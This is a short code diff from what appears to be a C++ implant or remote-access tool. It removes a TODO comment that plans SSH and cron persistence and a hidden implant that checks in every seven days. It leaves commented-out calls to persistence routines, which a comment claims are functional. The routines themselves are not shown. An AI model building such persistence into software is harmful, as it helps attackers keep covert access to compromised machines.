@@ -94,10 +94,6 @@ void Core::contact_server() {
 void Core::establish_persistence() {
     std::cout << "[+] establish_persistence() routine initialized." << '\n' << "[+] Attempting to establish SSH and Cron based persistence" << '\n';
 
-    /*
-     * TODO: attempt to establish both SSH and Cron based persistence; then create a hidden orphan implant and start it (this should reach out once every 7 days)
-     * */ 
-
     // if (establish_ssh_persistence() == true) {established_persistence_count++;}                       // true if persistence is established, false otherwise
     // if (establish_crontab_persistence() == true) {established_persistence_count++;}
     //      ^^^^^ both persistence routines are functional; the code should be reviewed again before use
